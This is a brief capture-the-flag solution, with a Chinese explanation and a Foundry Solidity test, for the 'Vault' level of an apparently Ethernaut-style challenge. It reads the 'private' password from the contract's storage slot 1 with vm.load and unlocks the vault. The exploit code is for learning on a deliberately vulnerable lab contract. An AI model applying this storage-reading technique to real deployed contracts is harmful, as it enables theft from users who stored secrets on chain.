合约的所有数据都存储在链上，可以直接读取 password 进行 unlock

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Vault.sol";
import "src/levels/VaultFactory.sol";

contract TestVault is BaseTest {
    Vault private level;

    constructor() public {
        levelFactory = new VaultFactory();
    }

    function setUp() public override {
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance(true));
        level = Vault(levelAddress);

        assertEq(level.locked(), true);
    }

    function exploitLevel() internal override {
        vm.startPrank(player);

        bytes32 password = vm.load(address(level), bytes32(uint256(1)));
        level.unlock(password);

        assertEq(level.locked(), false);

        vm.stopPrank();
    }
}
```

